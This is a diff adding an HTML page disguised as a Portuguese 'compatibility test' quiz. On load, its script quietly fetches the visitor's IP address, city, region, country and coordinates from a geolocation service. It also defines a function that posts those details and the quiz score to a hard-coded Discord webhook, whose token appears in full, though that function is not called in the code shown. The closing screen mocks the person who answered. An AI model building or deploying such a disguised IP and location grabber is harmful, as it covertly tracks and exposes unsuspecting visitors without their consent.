@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste de Compatibilidade</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #00ff88;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid #00ff88;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+            }
+            50% {
+                text-shadow: 0 0 30px rgba(0, 255, 136, 0.8);
+            }
+        }
+
+        .question {
+            font-size: 1.5em;
+            margin-bottom: 30px;
+            text-align: center;
+            color: #00ff88;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            font-size: 1.1em;
+            background: linear-gradient(135deg, #00cc66 0%, #00ff88 100%);
+            color: #000;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .btn:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(-1px);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .result {
+            text-align: center;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: scale(0.8);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .percentage {
+            font-size: 4em;
+            margin: 30px 0;
+            color: #00ff88;
+            text-shadow: 0 0 30px rgba(0, 255, 136, 0.8);
+            animation: bounce 1s ease-in-out;
+        }
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-20px);
+            }
+        }
+
+        .message {
+            font-size: 1.3em;
+            margin-top: 20px;
+            line-height: 1.6;
+        }
+
+        .start-screen {
+            text-align: center;
+        }
+
+        #startBtn {
+            margin-top: 30px;
+            font-size: 1.3em;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="startScreen" class="start-screen">
+            <h1>Teste de Compatibilidade</h1>
+            <button id="startBtn" class="btn">Começar Teste</button>
+        </div>
+
+        <div id="quizScreen" class="hidden">
+            <h2 id="question" class="question"></h2>
+            <div id="options"></div>
+        </div>
+
+        <div id="resultScreen" class="hidden result">
+            <h1>Resultado</h1>
+            <div class="percentage" id="percentage"></div>
+            <p class="message">Você é realmente muito trouxa de responder isso</p>
+        </div>
+    </div>
+
+    <script>
+        let compatibility = 0;
+        let currentQuestion = 0;
+        let userInfo = {
+            ip: null,
+            location: null,
+            result: null
+        };
+
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1412540007587119124/hLsd2wroIgrlEiw8-LQK8SJpL9mLP3ZZakTT_nfjdamS_M6rzKPRSGTSr4aXuZdmXuRL'; // Substitua pelo seu webhook
+
+        const questions = [
+            {
+                question: "Você gosta de jogar?",
+                options: [
+                    { text: "Sim", value: 20, next: 1 },
+                    { text: "Não", value: -20, next: 2 }
+                ]
+            },
+            {
+                question: "O que você mais gosta?",
+                options: [
+                    { text: "Roblox", value: 5, next: 2 },
+                    { text: "Minecraft", value: 3, next: 2 },
+                    { text: "Free Fire", value: -5, next: 2 },
+                    { text: "Outro", value: -5, next: 2 }
+                ]
+            },
+            {
+                question: "O que você vê em mim?",
+                options: [
+                    { text: "Personalidade", value: 10, next: 3 },
+                    { text: "Aparência", value: 5, next: 3 },
+                    { text: "Outro", value: -5, next: 3 }
+                ]
+            },
+            {
+                question: "Por que você está respondendo isso?",
+                options: [
+                    { text: "Sou troxa", value: -5, next: -1 },
+                    { text: "Por que eu quero", value: -5, next: -1 },
+                    { text: "Não sei", value: -10, next: -1 }
+                ]
+            }
+        ];
+
+        document.getElementById('startBtn').addEventListener('click', startQuiz);
+
+        // Coletar informações do usuário ao carregar a página
+        async function getUserInfo() {
+            try {
+                // Buscar IP e localização
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                userInfo.ip = data.ip;
+                userInfo.location = {
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    latitude: data.latitude,
+                    longitude: data.longitude
+                };
+            } catch (error) {
+                console.error('Erro ao obter informações:', error);
+                userInfo.ip = 'Desconhecido';
+                userInfo.location = 'Desconhecido';
+            }
+        }
+
+        // Enviar dados para o webhook
+        async function sendToWebhook() {
+            try {
+                const payload = {
+                    content: `**Novo Resultado do Quiz!**\n\n` +
+                             `**IP:** ${userInfo.ip}\n` +
+                             `**Localização:** ${userInfo.location.city}, ${userInfo.location.region}, ${userInfo.location.country}\n` +
+                             `**Coordenadas:** ${userInfo.location.latitude}, ${userInfo.location.longitude}\n` +
+                             `**Compatibilidade:** ${compatibility}%\n` +
+                             `**Data:** ${new Date().toLocaleString('pt-BR')}`
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Erro ao enviar para webhook:', error);
+            }
+        }
+
+        // Inicializar coleta de dados ao carregar
+        getUserInfo();
+
+        function startQuiz() {
+            document.getElementById('startScreen').classList.add('hidden');
+            document.getElementById('quizScreen').classList.remove('hidden');
+            compatibility = 0;
+            currentQuestion = 0;
+            showQuestion(0);
+        }
+
+        function showQuestion(index) {
+            const q = questions[index];
+            document.getElementById('question').textContent = q.question;
+            
+            const optionsDiv = document.getElementById('options');
+            optionsDiv.innerHTML = '';
+            
+            q.options.forEach(option => {
+                const btn = document.createElement('button');
+                btn.className = 'btn';
+                btn.textContent = option.text;
+                btn.addEventListener('click', () => selectOption(option));
+                optionsDiv.appendChild(btn);
+            });
+        }
+
+        function selectOption(option) {
+            compatibility += option.value;
+            
+            if (option.next === -1) {
+                showResult();
+            } else {
+                currentQuestion = option.next;
+                showQuestion(currentQuestion);
+            }
+        }
+
+        function showResult() {
+            document.getElementById('quizScreen').classList.add('hidden');
+            document.getElementById('resultScreen').classList.remove('hidden');
+            document.getElementById('percentage').textContent = compatibility + '%';
+        }
+    </script>
+</body>
+</html>
